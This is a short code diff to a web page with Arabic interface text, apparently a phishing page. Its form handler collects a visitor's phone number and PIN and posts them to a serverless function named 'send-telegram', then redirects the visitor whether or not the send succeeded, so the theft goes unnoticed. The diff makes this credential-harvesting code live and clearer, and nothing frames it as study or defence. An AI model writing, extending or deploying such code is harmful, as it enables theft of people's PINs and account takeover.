@@ -178,14 +178,14 @@ input[type="password"] {
         btn.disabled = true;
         btn.innerText = "جاري المعالجة...";
 
-        const name = document.getElementById('phone').value;
-        const lastName = document.getElementById('pin').value;
+        const phone = document.getElementById('phone').value;
+        const pin = document.getElementById('pin').value;
 
         try {
             const response = await fetch('/.netlify/functions/send-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name, lastName })
+                body: JSON.stringify({ phone, pin })
             });
 
             // سواء نجح الإرسال أو حدث خطأ بسيط، سنقوم بالتوجيه لضمان تجربة مستخدم مستمرة
